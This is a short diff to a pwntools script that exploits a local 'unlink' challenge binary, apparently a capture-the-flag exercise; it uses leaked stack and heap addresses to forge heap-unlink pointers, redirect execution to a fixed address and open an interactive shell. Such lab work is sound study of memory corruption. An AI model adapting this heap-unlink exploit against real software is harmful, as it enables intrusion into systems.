@@ -3,9 +3,17 @@ from pwn import *
 context.log_level = 'debug'
 p = process('/home/unlink/unlink')
 p.recvuntil('leak: ')
-stack = int(p.recvline().strip())
-data1 = stack + 0x28
-data2 = '\xeb\x84\x04\x08'
-data1 = p32(data1)
-p.sendline('6'*4*4 + data1 + data2)
-gdb.attach(p.proc.pid)
+stack = int(p.recvline().strip(),base=16)
+p.recvuntil('leak: ')
+heap = int(p.recvline().strip(),base=16)
+p.recvline()
+s = ""
+s += 'A'*4*4
+s += p32(stack-0x20)
+s += p32(heap+0x50)
+s = s.ljust(0x50 - 0x0C, 'A')
+s += p32(heap+0x50+0x8)
+s += 'A'*0x4
+s += p32(0x080484eb)
+p.sendline(s)
+p.interactive()
